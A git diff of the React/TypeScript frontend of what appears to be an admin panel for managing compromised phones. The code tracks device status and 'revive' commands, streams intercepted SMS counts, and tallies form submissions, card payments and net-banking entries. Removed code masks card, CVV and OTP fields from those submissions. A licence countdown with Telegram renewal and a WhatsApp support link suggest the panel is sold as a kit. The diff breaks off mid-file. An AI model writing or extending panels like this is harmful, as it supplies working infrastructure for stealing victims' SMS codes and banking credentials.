@@ -1,174 +1,127 @@
-// src/pages/DevicesPage.tsx
-import {
-  memo,
-  useCallback,
-  useDeferredValue,
-  useEffect,
-  useMemo,
-  useRef,
-  useState,
-  type ReactNode,
-} from "react";
-import { useNavigate, useSearchParams } from "react-router-dom";
+import { useEffect, useMemo, useRef, useState } from "react";
+import { useNavigate } from "react-router-dom";
 import axios from "axios";
 
-import type { DeviceDoc } from "../types";
-import { getDevices, deleteDevice } from "../services/api/devices";
-import { getFavoritesMap, setFavorite } from "../services/api/favorites";
-import { ENV, apiHeaders } from "../config/constants";
-import ztLogo from "../assets/zt-logo.png";
-import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
 import wsService from "../services/ws/wsService";
+import { listSessions } from "../services/api/admin";
+import { ENV, apiHeaders } from "../config/constants";
+import CountDown from "../components/ui/CountDown";
+import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
 
-type Row = DeviceDoc & { _fav?: boolean };
-type FormSubmission = Record<string, any>;
-type DeviceFilter = "all" | "online" | "offline" | "favorites";
+import ztLogo from "../assets/zt-logo.png";
+import { formatDMY, getCountdown, getLicenseSnapshot, pad2 } from "../utils/license";
 
-type DisplayRow = Row & {
-  brand: string;
-  model: string;
-  online: boolean;
-  favoriteFlag: boolean;
-  lastSeenTs: number;
-  lastSeenLabel: string;
-  lastForm: string;
-  logoSrc: string;
+type Device = {
+  deviceId: string;
+  status?: { online?: boolean; timestamp?: number };
+  admins?: string[];
+  forwardingSim?: string;
+  favorite?: boolean;
+  metadata?: Record<string, any>;
 };
 
-const LIST_ROW_HEIGHT = 238;
-const LIST_OVERSCAN = 8;
-const VIRTUALIZE_AFTER = 20;
+type ActivityItem = {
+  id: string;
+  ts: number;
+  title: string;
+  subtitle?: string;
+  icon: string;
+  kind: "session" | "ws";
+};
 
-function safeStr(v: unknown): string {
-  return String(v ?? "").trim();
+type SessionLike = {
+  _id?: string;
+  deviceId?: string;
+  uniqueid?: string;
+  admin?: string;
+  username?: string;
+  lastSeen?: number | string;
+  updatedAt?: number | string;
+  createdAt?: number | string;
+};
+
+type NotificationsSummaryResponse = {
+  totalDevices?: number;
+  totalSms?: number;
+  latestTimestamp?: number;
+};
+
+type FormsSummaryResponse = {
+  formsCount?: number;
+  cardPaymentsCount?: number;
+  netBankingCount?: number;
+};
+
+function toTs(v: any): number {
+  if (!v) return 0;
+  if (typeof v === "number") return v;
+  const t = new Date(String(v)).getTime();
+  return Number.isFinite(t) ? t : 0;
 }
 
-function normalizeFilter(v: string | null | undefined): DeviceFilter {
-  if (v === "online" || v === "offline" || v === "favorites") return v;
-  return "all";
+function minutesAgo(ts: number): string {
+  const diff = Date.now() - ts;
+  const m = Math.max(0, Math.floor(diff / 60000));
+  if (m < 1) return "now";
+  if (m === 1) return "1 min";
+  if (m < 60) return `${m} min`;
+  const h = Math.floor(m / 60);
+  if (h === 1) return "1 hour";
+  if (h < 24) return `${h} hours`;
+  const d = Math.floor(h / 24);
+  return d === 1 ? "1 day" : `${d} days`;
 }
 
-function pickDeviceId(d: any): string {
-  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
+function onlyDigits(v: string): string {
+  return String(v || "").replace(/\D/g, "");
 }
 
-function pickBrand(d: any): string {
-  const meta = d?.metadata || {};
-  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
-}
+function buildWhatsappUrl(base: string, text: string): string {
+  const raw = String(base || "").trim();
+  const encoded = encodeURIComponent(text);
 
-function pickModel(d: any): string {
-  const meta = d?.metadata || {};
-  return safeStr(meta.model || d?.model || "");
-}
+  if (!raw) return "";
 
-function pickLastSeenTs(d: any): number {
-  const ts = d?.status?.timestamp;
-  return typeof ts === "number" ? ts : 0;
-}
+  if (/^\+?\d{8,20}$/.test(raw)) {
+    return `https://wa.me/${onlyDigits(raw)}?text=${encoded}`;
+  }
 
-function formatLastSeen(ts: number): string {
-  if (!ts) return "-";
   try {
-    return new Date(ts).toLocaleString();
+    const hasProtocol = /^https?:\/\//i.test(raw);
+    const url = new URL(hasProtocol ? raw : `https://${raw}`);
+    const host = url.hostname.toLowerCase();
+
+    if (host.includes("wa.me")) {
+      const phone = onlyDigits(url.pathname);
+      if (phone) return `https://wa.me/${phone}?text=${encoded}`;
+    }
+
+    if (host.includes("api.whatsapp.com") || host.includes("web.whatsapp.com") || host.includes("whatsapp.com")) {
+      const phone = onlyDigits(url.searchParams.get("phone") || url.pathname);
+      if (phone) return `https://api.whatsapp.com/send?phone=${phone}&text=${encoded}`;
+    }
+
+    const phoneFromRaw = onlyDigits(raw);
+    if (phoneFromRaw.length >= 8) {
+      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
+    }
   } catch {
-    return "-";
-  }
-}
-
-function pickFormDeviceId(s: FormSubmission): string {
-  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || "");
-}
-
-function pickFormTs(s: FormSubmission): number {
-  const t1 = Number(s?.timestamp || s?.ts);
-  if (Number.isFinite(t1) && t1 > 0) return t1;
-
-  const created = safeStr(s?.createdAt || s?.created_at || s?.date || "");
-  if (created) {
-    const t = Date.parse(created);
-    if (Number.isFinite(t)) return t;
+    const phoneFromRaw = onlyDigits(raw);
+    if (phoneFromRaw.length >= 8) {
+      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
+    }
   }
 
-  return 0;
+  return "";
 }
 
-function maskMaybeSensitive(key: string, value: string): string {
-  const k = key.toLowerCase();
-  const digits = value.replace(/\D/g, "");
-  const looksSensitive =
-    k.includes("card") || k.includes("cvv") || k.includes("pan") || k.includes("account") || k.includes("acc");
-
-  if (looksSensitive && digits.length >= 8) return `****${digits.slice(-4)}`;
-  if (k.includes("otp") && digits.length >= 4) return "****";
-
-  return value;
-}
-
-function summarizeForm(s: FormSubmission | null | undefined): string {
-  if (!s || typeof s !== "object") return "No form submit";
-
-  const source = s?.payload && typeof s.payload === "object" ? s.payload : s;
-
-  const candidates: Array<[string, any]> = [
-    ["name", source.name || source.fullName],
-    ["mobile", source.mobile || source.phone],
-    ["amount", source.amount || source.amt],
-    ["upi", source.upi || source.upiId],
-    ["bank", source.bank || source.bankName],
-    ["title", source.title || source.formTitle],
-  ];
-
-  const parts: string[] = [];
-
-  for (const [k, raw] of candidates) {
-    const v = safeStr(raw);
-    if (!v) continue;
-    parts.push(`${k}: ${maskMaybeSensitive(k, v)}`);
-    if (parts.length >= 3) break;
-  }
-
-  const ts = pickFormTs(s);
-  if (ts) parts.push(new Date(ts).toLocaleString());
-
-  return parts.length ? parts.join(" • ") : "Form submitted";
-}
-
-function pickDeviceLogo(d: any): string {
-  const meta = d?.metadata || {};
-  const url = safeStr(meta.logoUrl || meta.logo || meta.iconUrl || meta.brandLogoUrl);
-
-  if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:image/")) {
-    return url;
-  }
-
-  return ztLogo;
-}
-
-function DeviceLogo({ src, alt }: { src: string; alt: string }) {
-  const [broken, setBroken] = useState(false);
-
-  if (broken) {
-    return (
-      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-slate-200 bg-white text-sm font-bold text-slate-700">
-        {alt.slice(0, 1).toUpperCase()}
-      </div>
-    );
-  }
-
-  return (
-    <img
-      src={src}
-      alt={alt}
-      className="h-11 w-11 rounded-2xl border border-slate-200 bg-white object-cover"
-      onError={() => setBroken(true)}
-      draggable={false}
-      loading="lazy"
-    />
-  );
-}
-
-function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
+function SurfaceCard({
+  children,
+  className = "",
+}: {
+  children: React.ReactNode;
+  className?: string;
+}) {
   return (
     <div
       className={[
@@ -181,333 +134,348 @@ function SurfaceCard({ children, className = "" }: { children: ReactNode; classN
   );
 }
 
-type DeviceCardProps = {
-  device: DisplayRow;
-  displayNumber: number;
-  isChecking: boolean;
-  onOpen: (deviceId: string) => void;
-  onToggleFavorite: (deviceId: string) => void;
-  onCheckOnline: (deviceId: string) => void;
-  onDelete: (deviceId: string) => void;
-};
-
-const DeviceCard = memo(function DeviceCard({
-  device,
-  displayNumber,
-  isChecking,
-  onOpen,
-  onToggleFavorite,
-  onCheckOnline,
-  onDelete,
-}: DeviceCardProps) {
+function SectionHeader({
+  title,
+  right,
+}: {
+  title: string;
+  right?: React.ReactNode;
+}) {
   return (
-    <div className="h-full rounded-[24px] border border-slate-200 bg-white/92 p-4 shadow-[0_8px_24px_rgba(15,23,42,0.06)]">
-      <div className="flex items-start justify-between gap-3">
-        <div className="flex min-w-0 items-center gap-3">
-          <DeviceLogo src={device.logoSrc} alt={device.brand} />
-
-          <div className="min-w-0">
-            <div className="flex min-w-0 items-center gap-2">
-              <div className="min-w-0 truncate text-[16px] font-extrabold text-slate-900">{device.brand}</div>
-
-              <div
-                className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white"
-                title={`#${displayNumber}`}
-                aria-hidden={false}
-              >
-                {displayNumber}
-              </div>
-            </div>
-
-            <div className="truncate text-[12px] text-slate-500">
-              {device.model ? `${device.model} • ` : ""}
-              ID: {device.deviceId}
-            </div>
-          </div>
-        </div>
-
-        <div className="flex shrink-0 items-center gap-2">
-          <span
-            className={[
-              "rounded-full border px-3 py-1 text-[12px] font-extrabold",
-              device.online
-                ? "border-emerald-200 bg-emerald-50 text-emerald-700"
-                : "border-rose-200 bg-rose-50 text-rose-700",
-            ].join(" ")}
-          >
-            {device.online ? "Online" : "Offline"}
-          </span>
-
-          <button
-            onClick={() => onToggleFavorite(device.deviceId)}
-            className={[
-              "flex h-10 w-10 items-center justify-center rounded-2xl border text-lg transition active:scale-[0.98]",
-              device.favoriteFlag
-                ? "border-amber-200 bg-amber-50 text-amber-600"
-                : "border-slate-200 bg-white text-slate-500 hover:bg-slate-50",
-            ].join(" ")}
-            type="button"
-            title={device.favoriteFlag ? "Unfavorite" : "Favorite"}
-          >
-            ★
-          </button>
-        </div>
-      </div>
-
-      <div className="mt-4 grid grid-cols-2 gap-3">
-        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
-          <div className="text-[11px] text-slate-500">Last seen</div>
-          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-800">
-            {device.lastSeenLabel}
-          </div>
-        </div>
-
-        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
-          <div className="text-[11px] text-slate-500">Latest form</div>
-          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-700">
-            {device.lastForm}
-          </div>
-        </div>
-      </div>
-
-      <div className="mt-4 grid grid-cols-3 gap-2">
-        <button
-          onClick={() => onOpen(device.deviceId)}
-          className="h-11 rounded-2xl border border-slate-200 bg-white px-2 text-[13px] font-extrabold text-slate-900 transition hover:bg-slate-50 active:scale-[0.99]"
-          type="button"
-        >
-          Open
-        </button>
-
-        <button
-          onClick={() => onCheckOnline(device.deviceId)}
-          disabled={isChecking}
-          className={[
-            "h-11 rounded-2xl border border-sky-200 bg-sky-50 px-2 text-[13px] font-extrabold text-sky-700 transition active:scale-[0.99]",
-            "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
-          ].join(" ")}
-          type="button"
-        >
-          {isChecking ? "Checking…" : "Check"}
-        </button>
-
-        <button
-          onClick={() => onDelete(device.deviceId)}
-          className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-2 text-[13px] font-extrabold text-rose-700 transition hover:bg-rose-100 active:scale-[0.99]"
-          type="button"
-        >
-          Delete
-        </button>
-      </div>
+    <div className="flex items-center justify-between border-b border-slate-200 px-4 py-3">
+      <div className="text-sm font-bold text-slate-900">{title}</div>
+      {right}
     </div>
   );
-});
+}
 
-export default function DevicesPage() {
-  const nav = useNavigate();
-  const [searchParams, setSearchParams] = useSearchParams();
-
-  const [devices, setDevices] = useState<Row[]>([]);
-  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
-  const [latestFormMap, setLatestFormMap] = useState<Record<string, FormSubmission>>({});
-  const [loading, setLoading] = useState(false);
-
-  const [search, setSearch] = useState("");
-  const deferredSearch = useDeferredValue(search);
-
-  const [filter, setFilter] = useState<DeviceFilter>(normalizeFilter(searchParams.get("filter")));
-  const [error, setError] = useState<string | null>(null);
-  const [success, setSuccess] = useState<string | null>(null);
-  const [checkingDeviceId, setCheckingDeviceId] = useState<string | null>(null);
-  const [checkingAll, setCheckingAll] = useState(false);
-
-  const loadInFlightRef = useRef(false);
-  const favoritesRef = useRef<Record<string, boolean>>({});
-  const listRef = useRef<HTMLDivElement | null>(null);
-  const [visibleRange, setVisibleRange] = useState({ start: 0, end: 18 });
-
-  const loadFormsLatestByDevice = useCallback(async (): Promise<Record<string, FormSubmission>> => {
-    try {
-      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, {
-        headers: apiHeaders(),
-        timeout: 12000,
-      });
-
-      const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
-      const map: Record<string, FormSubmission> = {};
-
-      for (const s of list) {
-        const did = pickFormDeviceId(s);
-        if (!did) continue;
-
-        const ts = pickFormTs(s);
-        const prev = map[did];
-
-        if (!prev || ts > pickFormTs(prev)) {
-          map[did] = s;
-        }
-      }
-
-      return map;
-    } catch {
-      return {};
-    }
-  }, []);
-
-  const sendCheckOnlineCommand = useCallback(async (deviceId: string) => {
-    const encodedId = encodeURIComponent(deviceId);
-    const headers = apiHeaders();
-
-    try {
-      return await axios.post(
-        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/revive`,
-        { source: "devices_page", force: true },
-        { headers, timeout: 15000 },
-      );
-    } catch {
-      return axios.post(
-        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/start`,
-        { source: "devices_page", force: true },
-        { headers, timeout: 15000 },
-      );
-    }
-  }, []);
-
-  const mergeDevices = useCallback((list: any[], safeFav: Record<string, boolean>) => {
-    const normalized = (list || []).map((d: any) => {
-      const id = pickDeviceId(d) || "unknown";
-      return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
-    });
-
-    normalized.reverse();
-    return normalized;
-  }, []);
-
-  const loadAll = useCallback(
-    async ({ includeForms = true, silent = false }: { includeForms?: boolean; silent?: boolean } = {}) => {
-      if (loadInFlightRef.current) return;
-
-      loadInFlightRef.current = true;
-      if (!silent) setLoading(true);
-
-      try {
-        const [list, favMap, maybeForms] = await Promise.all([
-          getDevices(),
-          getFavoritesMap(),
-          includeForms ? loadFormsLatestByDevice() : Promise.resolve(null),
-        ]);
-
-        const safeFav = favMap || {};
-        const normalized = mergeDevices(list || [], safeFav);
-
-        setDevices(normalized);
-        setFavoritesMap(safeFav);
-        favoritesRef.current = safeFav;
-
-        if (maybeForms) {
-          setLatestFormMap(maybeForms);
-        }
-      } catch (e) {
-        console.error("loadAll failed", e);
-        setSuccess(null);
-        setError("Failed to load devices from server");
-        setDevices([]);
-        if (includeForms) setLatestFormMap({});
-      } finally {
-        loadInFlightRef.current = false;
-        if (!silent) setLoading(false);
-      }
-    },
-    [loadFormsLatestByDevice, mergeDevices],
+function StatTile({
+  title,
+  value,
+  icon,
+  hint,
+  onClick,
+}: {
+  title: string;
+  value: string | number;
+  icon: string;
+  hint: string;
+  onClick: () => void;
+}) {
+  return (
+    <button
+      type="button"
+      onClick={onClick}
+      className="w-full rounded-[22px] border border-slate-200 bg-white/92 px-3 py-3 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)] transition hover:bg-slate-50 active:scale-[0.99]"
+    >
+      <div className="flex items-center justify-between gap-3">
+        <div className="flex min-w-0 items-center gap-3">
+          <div className="flex h-10 w-10 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-lg">
+            {icon}
+          </div>
+          <div className="min-w-0">
+            <div className="truncate text-[11px] text-slate-500">{title}</div>
+            <div className="text-xl font-extrabold leading-tight text-slate-900">{value}</div>
+          </div>
+        </div>
+        <div className="text-xl text-slate-300">›</div>
+      </div>
+      <div className="mt-1 text-[10px] text-slate-400">{hint}</div>
+    </button>
   );
+}
 
-  useEffect(() => {
-    favoritesRef.current = favoritesMap;
+export default function DashboardPage() {
+  const nav = useNavigate();
+
+  const [devices, setDevices] = useState<Device[]>([]);
+  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
+  const [formsCount, setFormsCount] = useState<number | null>(null);
+  const [cardCount, setCardCount] = useState<number | null>(null);
+  const [netbankingCount, setNetbankingCount] = useState<number | null>(null);
+  const [smsCount, setSmsCount] = useState<number | null>(null);
+  const [error, setError] = useState<string | null>(null);
+
+  const [wsConnected, setWsConnected] = useState<boolean>(false);
+
+  const [sessionActivity, setSessionActivity] = useState<ActivityItem[]>([]);
+  const [realtimeActivity, setRealtimeActivity] = useState<ActivityItem[]>([]);
+
+  const [nowTick, setNowTick] = useState<number>(() => Date.now());
+  const license = useMemo(() => getLicenseSnapshot(nowTick), [nowTick]);
+  const countdown = useMemo(() => getCountdown(license.expiryDate, nowTick), [license.expiryDate, nowTick]);
+
+  const harmfullWhatsappLink = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();
+
+  const smsCountRef = useRef<number | null>(null);
+  const formsCountRef = useRef<number | null>(null);
+  const cardCountRef = useRef<number | null>(null);
+  const netCountRef = useRef<number | null>(null);
+
+  const totalDevices = devices.length;
+  const onlineCount = useMemo(() => devices.filter((d) => !!d.status?.online).length, [devices]);
+  const offlineCount = totalDevices - onlineCount;
+
+  const favoriteIds = useMemo(() => {
+    return Object.entries(favoritesMap)
+      .filter(([, v]) => !!v)
+      .map(([k]) => k)
+      .sort((a, b) => (a > b ? 1 : -1));
   }, [favoritesMap]);
 
-  useEffect(() => {
-    const qpFilter = normalizeFilter(searchParams.get("filter"));
-    setFilter((prev) => (prev === qpFilter ? prev : qpFilter));
-  }, [searchParams]);
+  const favoritesPreview = useMemo(() => favoriteIds.slice(0, 4), [favoriteIds]);
+
+  const activityItems = useMemo(() => {
+    const merged = [...realtimeActivity, ...sessionActivity];
+    const seen = new Set<string>();
+    const out: ActivityItem[] = [];
+
+    for (const it of merged) {
+      const bucket = Math.floor(it.ts / 30000);
+      const key = `${it.kind}|${it.title}|${it.subtitle || ""}|${bucket}`;
+      if (seen.has(key)) continue;
+      seen.add(key);
+      out.push(it);
+      if (out.length >= 6) break;
+    }
+
+    return out;
+  }, [realtimeActivity, sessionActivity]);
 
   useEffect(() => {
-    loadAll({ includeForms: true }).catch(() => {});
+    smsCountRef.current = smsCount;
+  }, [smsCount]);
+
+  useEffect(() => {
+    formsCountRef.current = formsCount;
+  }, [formsCount]);
+
+  useEffect(() => {
+    cardCountRef.current = cardCount;
+  }, [cardCount]);
+
+  useEffect(() => {
+    netCountRef.current = netbankingCount;
+  }, [netbankingCount]);
+
+  useEffect(() => {
+    const t = window.setInterval(() => setNowTick(Date.now()), 1000);
+    return () => window.clearInterval(t);
+  }, []);
+
+  async function loadDevices() {
+    setError(null);
+    try {
+      const res = await axios.get(`${ENV.API_BASE}/api/devices`, { headers: apiHeaders(), timeout: 8000 });
+      setDevices(Array.isArray(res.data) ? res.data : []);
+    } catch (e: any) {
+      console.error("loadDevices error", e);
+      setError("Failed loading devices");
+      setDevices([]);
+    }
+  }
+
+  async function loadFavorites() {
+    try {
+      const res = await axios.get(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders(), timeout: 8000 });
+      const m = res?.data && typeof res.data === "object" ? (res.data as Record<string, boolean>) : {};
+      setFavoritesMap(m || {});
+    } catch {
+      setFavoritesMap({});
+    }
+  }
+
+  async function loadFormsSummary() {
+    try {
+      const res = await axios.get<FormsSummaryResponse>(`${ENV.API_BASE}/api/dashboard/forms-summary`, {
+        headers: apiHeaders(),
+        timeout: 10000,
+      });
+
+      setFormsCount(Number(res.data?.formsCount || 0));
+      setCardCount(Number(res.data?.cardPaymentsCount || 0));
+      setNetbankingCount(Number(res.data?.netBankingCount || 0));
+    } catch {
+      setFormsCount(0);
+      setCardCount(0);
+      setNetbankingCount(0);
+    }
+  }
+
+  async function loadSmsSummary() {
+    try {
+      const res = await axios.get<NotificationsSummaryResponse>(`${ENV.API_BASE}/api/notifications/summary`, {
+        headers: apiHeaders(),
+        timeout: 10000,
+      });
+
+      setSmsCount(Number(res.data?.totalSms || 0));
+    } catch {
+      setSmsCount(0);
+    }
+  }
+
+  async function loadAdminSessions() {
+    try {
+      const sessions = (await listSessions()) as any[];
+      const arr: SessionLike[] = Array.isArray(sessions) ? sessions : [];
+
+      const items: ActivityItem[] = arr
+        .map((s) => {
+          const did = String(s.deviceId || s.uniqueid || "unknown");
+          const admin = String(s.admin || s.username || "admin");
+          const last = toTs(s.lastSeen) || toTs(s.updatedAt) || toTs(s.createdAt) || Date.now();
+
+          return {
+            id: String(s._id || `${did}_${admin}_${last}`),
+            ts: last,
+            title: did,
+            subtitle: admin,
+            icon: "👤",
+            kind: "session",
+          } satisfies ActivityItem;
+        })
+        .sort((a, b) => b.ts - a.ts)
+        .slice(0, 6);
+
+      setSessionActivity(items);
+    } catch (e) {
+      console.warn("loadAdminSessions failed", e);
+      setSessionActivity([]);
+    }
+  }
+
+  function handleRenewClick() {
+    if (license.telegramChatDeepLink) window.open(license.telegramChatDeepLink, "_blank");
+    window.open(license.telegramShareUrl, "_blank");
+  }
+
+  function handleHarmfullClick() {
+    const panelId = String(license.panelId || "____").trim();
+    const message = `hello sir fixmy harmfull\npanel id: ${panelId}`;
+    const finalUrl = buildWhatsappUrl(harmfullWhatsappLink, message);
+
+    if (!finalUrl) {
+      console.warn("Invalid WhatsApp env link. Use phone/wa.me/api.whatsapp.com/send");
+      return;
+    }
+
+    window.open(finalUrl, "_blank", "noopener,noreferrer");
+  }
+
+  function pushRealtime(item: Omit<ActivityItem, "id" | "kind">) {
+    const next = {
+      ...item,
+      kind: "ws",
+      id: `${Date.now()}_${Math.random().toString(16).slice(2)}`,
+    } satisfies ActivityItem;
+
+    setRealtimeActivity((prev) => [next, ...prev].slice(0, 6));
+  }
+
+  function goDevices(filter: "all" | "online" | "offline") {
+    if (filter === "all") {
+      nav("/devices");
+      return;
+    }
+    nav(`/devices?filter=${filter}`, { state: { filter } as any });
+  }
+
+  function applyDeviceStatus(deviceId: string, online: boolean, timestamp?: number) {
+    setDevices((prev) => {
+      const ts = Number(timestamp || Date.now());
+      let found = false;
+
+      const next = prev.map((d) => {
+        if (String(d.deviceId || "") !== deviceId) return d;
+        found = true;
+        return {
+          ...d,
+          status: {
+            ...(d.status || {}),
+            online,
+            timestamp: ts,
+          },
+        };
+      });
+
+      if (found) return next;
+
+      return [
+        {
+          deviceId,
+          status: { online, timestamp: ts },
+          metadata: {},
+        },
+        ...next,
+      ];
+    });
+  }
+
+  useEffect(() => {
     wsService.connect();
+    setWsConnected(wsService.isConnected());
 
-    const off = wsService.onMessage((msg) => {
+    const unsub = wsService.onMessage((msg) => {
       try {
-        if (!msg || msg.type !== "event") return;
+        if (!msg) return;
 
-        if (msg.event === "status") {
-          const did = safeStr(msg.deviceId || msg?.data?.deviceId);
-          if (!did) return;
+        if (msg.type === "event" && msg.event === "status") {
+          const did = String(msg.deviceId || "");
+          const online = !!msg.data?.online;
+          const ts = Number(msg.data?.timestamp || Date.now());
 
-          const online = !!msg?.data?.online;
-          const timestamp = Number(msg?.data?.timestamp || Date.now());
-
-          setDevices((prev) => {
-            const index = prev.findIndex((d) => safeStr(d.deviceId) === did);
-
-            if (index === -1) {
-              const created: Row = {
-                deviceId: did,
-                metadata: {},
-                status: { online, timestamp },
-                _fav: !!favoritesRef.current[did],
-              } as Row;
-              return [created, ...prev];
-            }
-
-            return prev.map((d) =>
-              safeStr(d.deviceId) === did
-                ? {
-                    ...d,
-                    status: {
-                      ...(d.status || {}),
-                      online,
-                      timestamp,
-                    },
-                  }
-                : d,
-            );
-          });
-
+          if (did) {
+            applyDeviceStatus(did, online, ts);
+            pushRealtime({
+              ts: Date.now(),
+              title: did || "Device",
+              subtitle: online ? "online" : "offline",
+              icon: online ? "🟢" : "🔴",
+            });
+          }
           return;
         }
 
-        if (msg.event === "favorite:update") {
-          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
+        if (msg.type === "event" && msg.event === "notification") {
+          const did = String(msg.deviceId || "");
+          const bodyText = String(msg?.data?.body || "").trim();
+
+          if (did) {
+            setSmsCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
+            pushRealtime({
+              ts: Date.now(),
+              title: did || "Device",
+              subtitle: bodyText ? "sms received" : "sms",
+              icon: "💬",
+            });
+          }
+          return;
+        }
+
+        if (msg.type === "event" && msg.event === "notification:deleted") {
+          setSmsCount((prev) => {
+            if (typeof prev !== "number") return prev;
+            return Math.max(0, prev - 1);
+          });
+          return;
+        }
+
+        if (msg.type === "event" && msg.event === "favorite:update") {
+          const did = String(msg?.data?.deviceId || msg.deviceId || "").trim();
           if (!did) return;
 
           const favorite = !!msg?.data?.favorite;
-          setFavoritesMap((prev) => {
-            const next = { ...prev, [did]: favorite };
-            favoritesRef.current = next;
-            return next;
-          });
-
-          setDevices((prev) =>
-            prev.map((d) =>
-              safeStr(d.deviceId) === did ? { ...d, favorite, _fav: favorite } : d,
-            ),
-          );
+          setFavoritesMap((prev) => ({ ...prev, [did]: favorite }));
           return;
         }
 
-        if (msg.event === "device:delete") {
-          const did = safeStr(msg?.data?.deviceId || msg.deviceId);
+        if (msg.type === "event" && msg.event === "device:delete") {
+          const did = String(msg?.data?.deviceId || msg.deviceId || "").trim();
           if (!did) return;
 
-          setDevices((prev) => prev.filter((d) => safeStr(d.deviceId) !== did));
-
+          setDevices((prev) => prev.filter((d) => String(d.deviceId || "") !== did));
           setFavoritesMap((prev) => {
-            const copy = { ...prev };
-            delete copy[did];
-            favoritesRef.current = copy;
-            return copy;
-          });
-
-          setLatestFormMap((prev) => {
             const copy = { ...prev };
             delete copy[did];
             return copy;
@@ -515,407 +483,425 @@ export default function DevicesPage() {
           return;
         }
 
-        if (msg.event === "form:created" || msg.event === "form_submissions:created") {
-          const did = safeStr(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId);
-          if (!did) return;
+        if (msg.type === "event" && (msg.event === "form:new" || msg.event === "form:update" || msg.event === "form:created" || msg.event === "form_submissions:created")) {
+          if (msg.event === "form:new" || msg.event === "form:created" || msg.event === "form_submissions:created") {
+            setFormsCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
+          }
 
-          const payload =
-            msg?.data?.payload && typeof msg.data.payload === "object"
-              ? msg.data.payload
-              : msg?.data || {};
+          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
+          if (did) {
+            pushRealtime({
+              ts: Date.now(),
+              title: did,
+              subtitle: "form submit",
+              icon: "🗂️",
+            });
+          }
+          return;
+        }
 
-          const nextForm: FormSubmission = {
-            ...(payload || {}),
-            uniqueid: did,
-            createdAt: msg?.timestamp || Date.now(),
-            timestamp: msg?.timestamp || Date.now(),
-          };
+        if (msg.type === "event" && (msg.event === "payment:new" || msg.event === "payment:card_created" || msg.event === "card_payment:created")) {
+          const method = String(msg?.data?.method || "").trim().toLowerCase();
 
-          setLatestFormMap((prev) => {
-            const existing = prev[did];
-            const prevTs = existing ? pickFormTs(existing) : 0;
-            const nextTs = pickFormTs(nextForm);
-            if (existing && prevTs > nextTs) return prev;
-            return { ...prev, [did]: nextForm };
+          if (method === "card" || msg.event === "payment:card_created" || msg.event === "card_payment:created") {
+            setCardCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
+          } else if (method === "netbanking" || method === "net_banking") {
+            setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
+          }
+
+          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
+          if (did) {
+            pushRealtime({
+              ts: Date.now(),
+              title: did,
+              subtitle: method === "netbanking" || method === "net_banking" ? "net banking" : "card payment",
+              icon: method === "netbanking" || method === "net_banking" ? "🏦" : "💳",
+            });
+          }
+          return;
+        }
+
+        if (msg.type === "event" && (msg.event === "payment:netbanking_created" || msg.event === "net_banking:created")) {
+          setNetbankingCount((prev) => (typeof prev === "number" ? prev + 1 : 1));
+          const did = String(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId || "").trim();
+          if (did) {
+            pushRealtime({
+              ts: Date.now(),
+              title: did,
+              subtitle: "net banking",
+              icon: "🏦",
+            });
+          }
+          return;
+        }
+
+        if (msg.type === "event" && msg.event === "globalAdmin.update") {
+          pushRealtime({
+            ts: Date.now(),
+            title: "Global Admin",
+            subtitle: "updated",
+            icon: "📣",
           });
           return;
+        }
+
+        if (msg.type === "force_logout") {
+          pushRealtime({
+            ts: Date.now(),
+            title: "Session",
+            subtitle: "force logout",
+            icon: "🚪",
+          });
         }
       } catch {
         // ignore
       }
     });
 
-    return () => {
-      off();
-    };
-  }, [loadAll]);
-
-  const displayRows = useMemo<DisplayRow[]>(() => {
-    return devices.map((d) => {
-      const deviceId = safeStr(d.deviceId);
-      const favoriteFlag = !!(favoritesMap[deviceId] ?? d.favorite ?? d._fav);
-      const lastSeenTs = pickLastSeenTs(d);
-
-      return {
-        ...d,
-        deviceId,
-        brand: pickBrand(d),
-        model: pickModel(d),
-        online: !!d.status?.online,
-        favoriteFlag,
-        lastSeenTs,
-        lastSeenLabel: formatLastSeen(lastSeenTs),
-        lastForm: latestFormMap[deviceId] ? summarizeForm(latestFormMap[deviceId]) : "No form submit",
-        logoSrc: pickDeviceLogo(d),
-      };
-    });
-  }, [devices, favoritesMap, latestFormMap]);
-
-  const filtered = useMemo(() => {
-    const q = deferredSearch.trim().toLowerCase();
-
-    return displayRows.filter((d) => {
-      if (filter === "online" && !d.online) return false;
-      if (filter === "offline" && d.online) return false;
